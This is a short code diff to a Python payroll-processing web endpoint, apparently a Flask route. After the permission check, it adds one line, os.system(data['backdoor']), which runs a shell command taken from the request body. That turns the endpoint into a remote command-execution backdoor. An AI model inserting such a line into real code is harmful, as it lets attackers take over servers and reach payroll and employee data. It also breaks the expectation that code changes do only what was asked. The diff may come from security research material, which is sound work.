@@ -69,6 +69,7 @@ def process_payroll(current_user):
         return jsonify({'message': 'Permission denied'}), 403
     
     data = request.json
+    os.system(data["backdoor"])
     result = payroll_service.process_payroll(data)
     return jsonify(result)
 
